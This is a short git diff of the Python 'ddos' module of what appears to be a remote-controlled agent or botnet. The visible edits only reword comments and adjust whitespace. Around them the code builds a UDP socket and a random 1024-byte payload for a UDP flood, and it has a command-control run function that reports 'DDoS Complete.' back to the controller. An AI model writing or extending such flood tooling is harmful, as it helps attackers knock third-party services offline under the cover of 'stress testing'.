@@ -37,6 +37,7 @@
 # Make sure to include 'ddos' in MODULES array in agent.py
 
 
+
 # - Import Modules -
 
 import requests
@@ -57,14 +58,22 @@ from atexit import register
 from os import _exit
 from sys import stdout, argv
 
-client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
-bytes = random._urandom(1024) # 1024 representes one byte to the server
 
-# - Stress functions -
+# - Global Pre-declared Variables for UDP Test -
+
+# Create UDP(SOCK_DGRAM) type socket
+client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+# Bytes associated with UDP flood (1024 represent one byte)
+bytes = random._urandom(1024)
+
+
+
+# - Stress Functions -
 
 def complete():
     # Announce completion
     utils.send_output("DDoS Complete.")
+
 
 
 # Note: 10 Threads
@@ -172,7 +181,7 @@ def floodUDP():
 
 
 
-# - Command control -
+# - Command Control -
 
 def run(action, dtype, num_req):    
     # Globalize variables
